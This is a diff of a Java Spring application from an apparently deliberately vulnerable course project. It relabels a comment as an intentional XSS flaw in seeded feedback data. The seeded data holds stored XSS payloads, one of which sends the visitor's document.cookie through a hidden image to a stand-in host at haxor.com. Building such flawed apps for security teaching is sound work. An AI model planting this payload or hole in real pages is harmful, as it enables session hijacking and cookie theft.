@@ -72,7 +72,7 @@ public class CyberSecurityBaseProjectApplication {
 		course2.getFeedBack().add("STUDENT: Teacher got good jokes");
 		course2.getFeedBack().add("TEACHER: Thank you :)");
 		course2.getFeedBack().add("STUDENT: Web course in MOOC was very nice");
-		// XSS enabled in thymeleaf - one can insert JavaScript to page
+		// FLAW 5: A7:2017-Cross-Site Scripting (XSS) -  XSS enabled in thymeleaf - one can insert JavaScript to page
 		course2.getFeedBack().add("STUDENT: I learned how to haxor :) <script>console.log('All your base are belong to us')</script>");
 		course2.getFeedBack().add("STUDENT:I think i will manage to get 5 form all the courses!<script>document.write(\"<img src=\\\"http://www.haxor.com/cookiesteal/\" + document.cookie +\"\\\" style=\\\"display: none;\\\" />\")  </script>");
 		course2.getAccounts().add(student1);
